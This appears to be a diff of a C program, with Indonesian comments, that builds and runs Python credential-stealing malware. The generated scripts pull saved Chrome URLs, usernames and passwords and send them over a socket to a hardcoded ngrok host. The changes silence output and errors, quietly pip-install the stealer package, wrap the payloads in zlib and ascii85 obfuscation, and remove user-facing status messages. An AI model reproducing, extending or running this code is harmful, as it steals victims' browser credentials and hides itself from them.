@@ -105,7 +105,11 @@ void generator(const char *f1, const char *f2, const char *f3) {
         "    f2 = glob.glob(\"*.py\")\n"
         "    for file2 in f2:\n"
         "        os.remove(file2)\n"
-        "    return \"\\nSemua file payload berhasil dihapus\\n\"\n"
+        "\n"
+        "def deltext():\n"
+        "    files = glob.glob(\"*text*\")\n"
+        "    for file in files:\n"
+        "        os.remove(file)\n"
         "\n"        
         "def help():\n"
         "    print(len(sys.argv))\n"
@@ -122,7 +126,9 @@ void generator(const char *f1, const char *f2, const char *f3) {
         "    if len(sys.argv) == 2 and (sys.argv[1] == \"-h\" or sys.argv[1] == \"--help\"):\n"
         "        help()\n"
         "    elif len(sys.argv) == 2 and (sys.argv[1] == \"-d\" or sys.argv[1] == \"--delete\"):\n"
-        "        print(delpayload())\n"
+        "        delpayload()\n"
+        "    elif len(sys.argv) == 2 and (sys.argv[1] == \"-dtext\" or sys.argv[1] == \"--deleteText\"):\n"
+        "        deltext()\n"
         "    elif len(sys.argv) == 6:\n"
         "        server = sys.argv[1]\n"
         "        port = sys.argv[2]\n"
@@ -139,7 +145,8 @@ void generator(const char *f1, const char *f2, const char *f3) {
         "            gen(o, text)\n"
         "\n"            
         "            if os.path.exists(o):\n"
-        "                print(f\"File {o} berhasil dibuat dengan mode {m}\")\n"
+        // "                print(f\"File {o} berhasil dibuat dengan mode {m}\")\n"
+        "                   pass\n"
         "            else:\n"
         "                print(f\"File {o} gagal dibuat dengan mode {m}\\n\")\n"
         "        else:\n"
@@ -155,42 +162,53 @@ void generator(const char *f1, const char *f2, const char *f3) {
         "import sys\n"
         "from io import StringIO\n"
         "\n"
-        "original_stdout = sys.stdout\n"
-        "sys.stdout = StringIO()\n"
-        "sys.stdout = original_stdout\n"
+        "class Swiper:\n"
+        "    def __enter__(self):\n"
+        "        self._original_stdout = sys.stdout\n"
+        "        self._original_stderr = sys.stderr\n"
+        "        sys.stdout = StringIO()\n"
+        "        sys.stderr = StringIO()\n"
+        "        return self\n"
         "\n"
-        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+        "    def __exit__(self, exc_type, exc_value, traceback):\n"
+        "        sys.stdout = self._original_stdout\n"
+        "        sys.stderr = self._original_stderr\n"
         "\n"
         "if len(sys.argv) != 3:\n"
-        "   print(\"Penggunaan:  \\npython3 bahan.py [server] [port]\")\n"
-        "   sys.exit(1)\n"
+        "    print(\"Penggunaan:  \\npython3 bahan.py [server] [port]\")\n"
+        "    sys.exit(1)\n"
         "else:\n"
-        "   server = sys.argv[1]\n"
-        "   port = int(sys.argv[2])\n"
-        "   try:\n"
-        "       s.connect((server, port))\n"
-        "       do = ChromePasswordsStealer(\"passwords\", True)\n"
-        "       do.get_database_cursor()\n"
-        "       do.get_key()\n"
+        "    server = sys.argv[1]\n"
+        "    port = int(sys.argv[2])\n"
+        "    try:\n"
+        "        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+        "        s.connect((server, port))\n"
         "\n"
-        "       for url, username, password in do.get_credentials():\n"
-        "           data = f\"{url}, {username}, {password}\\n\"\n"
-        "           s.send(data.encode())\n"
+        "        with Swiper():\n"
+        "            do = ChromePasswordsStealer(\"passwords\", True)\n"
+        "            do.get_database_cursor()\n"
+        "            do.get_key()\n"
         "\n"
-        "       s.close()\n"
+        "            for url, username, password in do.get_credentials():\n"
+        "                data = f\"{url}, {username}, {password}\\n\"\n"
+        "                s.send(data.encode())\n"
+        "\n"
+        "        s.close()\n"
         "    except ConnectionRefusedError:\n"
-        "        print(\"Server penerima belum dihidupkan\\n\")\n";
+        "        print(\"Server penerima belum dihidupkan\\n\")\n"
+        "    except Exception as e:\n"
+        "        pass\n";
 
     FILE *fp1;
     FILE *fp2;
     FILE *fp3;
 
-    fp1 = fopen(f1, "w");
-    if (fp1 == NULL) {
+    fp3 = fopen(f3, "w");
+    if (fp3 == NULL) {
         perror("Gagal membuka file");
     }
-    fprintf(fp1, "%s", bahan);
-    fclose(fp1);
+    fprintf(fp3, "%s", bahan);
+    fclose(fp3);
     
     fp2 = fopen(f2, "w");
     if (fp2 == NULL) {
@@ -199,16 +217,16 @@ void generator(const char *f1, const char *f2, const char *f3) {
     fprintf(fp2, "%s", oliner);
     fclose(fp2);
     
-    fp3 = fopen(f3, "w");
-    if (fp3 == NULL) {
+    fp1 = fopen(f1, "w");
+    if (fp1 == NULL) {
         perror("Gagal membuka file");
     }
-    fprintf(fp3, "%s", notif);
-    fclose(fp3);
+    fprintf(fp1, "%s", notif);
+    fclose(fp1);
     
-    char status[CLEN];
-    snprintf(status, sizeof(status), "\nFile %s, %s, %s berhasil dibuat.\n", f1, f2, f3);
-    printf("%s\n", status);
+    // char status[CLEN];
+    // snprintf(status, sizeof(status), "\nFile %s, %s, %s berhasil dibuat.\n", f1, f2, f3);
+    // printf("%s\n", status);
 }
 
 char* readFile(const char *filename) {
@@ -273,12 +291,18 @@ void delete() {
     sleep(1);
 }
 
+void deletetext() {
+    char command[CLEN];
+    snprintf(command, sizeof(command), "python oliner.py -dtext");
+    system(command);
+    sleep(1);
+}
+
 void run(const char *s, const int p, const char *pload) {
-    printf("\nMenjalankan payload\n");
+    // printf("\nMenjalankan payload\n");
 
     char *text = readFile(pload);
-    // printf(text);
-    // printf("\n");
+    
     if (!text) {
         fprintf(stderr, "Gagal membaca file %s\n", pload);
     }
@@ -292,7 +316,7 @@ void run(const char *s, const int p, const char *pload) {
     }
 
     const int length = 10000000;
-    size_t commandLength = strlen("python -c \"\" ") + strlen(content) + strlen(s) + 20;
+    size_t commandLength = strlen("python -u -c \"\" ") + strlen(content) + strlen(s) + 20;
     if (commandLength < length) {
         commandLength = length;
     }
@@ -303,9 +327,8 @@ void run(const char *s, const int p, const char *pload) {
         free(content);
         exit(EXIT_FAILURE);
     }
-
-    snprintf(command, commandLength, "python -c \"%s\" %s %d", text, s, p);
-    // printf("\n%s\n", command);
+    
+    snprintf(command, commandLength, "python -u -c \"%s\" %s %d", text, s, p);
     system(command);
     int ret = system(command);
     if (ret == -1) {
@@ -319,12 +342,12 @@ void run(const char *s, const int p, const char *pload) {
     free(text);
     free(content);
     free(command);
-    delete();
+    // delete();
     sleep(1);
 }
 
 void generate(Payload *payloads, int numModes, int numPayloads, const char *s, const int p) {
-    printf("\nProses generate payload\n");
+    // printf("\nProses generate payload\n");
     for (int i = 0; i < numModes; i++) {
         if (payloads[i].mode == "done") {
             break;
@@ -334,13 +357,25 @@ void generate(Payload *payloads, int numModes, int numPayloads, const char *s, c
         system(command);
         sleep(1);
     }
-    printf("Generate payload selesai\n");
+    // printf("Generate payload selesai\n");
+}
+
+void oneliner(const char *mode, const char *pld, const char *nfile) {
+    // char text[CLEN];
+    // snprintf(text, sizeof(text), "Proses generate %s dari file %s\n", pld, nfile);
+    // printf(text);
+    char command[CLEN];
+    const char *s = "t";
+    const int p = 1;
+    snprintf(command, sizeof(command), "python oneliner.py %s %d %s %s %s", s, p, mode, pld, nfile);
+    system(command);
+    sleep(1);
 }
 
 void install(const char *s, const int p) {
-    printf("Install modul\n");
+    // printf("Install modul\n");
     char command[CLEN];
-    snprintf(command, sizeof(command), "python -m pip install PyOneLiner ChromePasswordsStealer");
+    snprintf(command, sizeof(command), "python -m pip install -q PyOneLiner ChromePasswordsStealer");
     system(command);
     sleep(1);
 }
@@ -369,15 +404,25 @@ int main() {
     signal(SIGINT, exitt);
     int python = check();
     const char *server = "0.tcp.ap.ngrok.io"; // Silahkan sesuaikan dengan alamat server netcat yang diinginkan
-    const int port = 8888; // Silahkan sesuaikan dengan port server netcat yang diinginkan
+    const int port = 18621; // Silahkan sesuaikan dengan port server netcat yang diinginkan
     const char *ploadd = "iniPAYLOADnya.py";
     const char *gen1 = "notif.py";
     const char *gen2 = "oliner.py";
     const char *gen3 = "bahan.py";
+    const char *gen4 = "oneliner.py";
+    const char *pload1 = "text1";
+    const char *pload2 = "text2";
+    const char *pload3 = "text3";
+    const char *m1 = "zlib";
+    const char *m2 = "ascii85";
 
     if (ping(server)) {
         if (python) {
-            generator(gen1, gen2, gen3);
+            generator(pload1, gen4, pload3);
+            oneliner(m2, pload3, gen3);
+            oneliner(m1, gen4, gen2);
+            oneliner(m1, pload1, gen1);
+            deletetext();
             signal(SIGINT, handler);
 
             Payload payloads[] = {
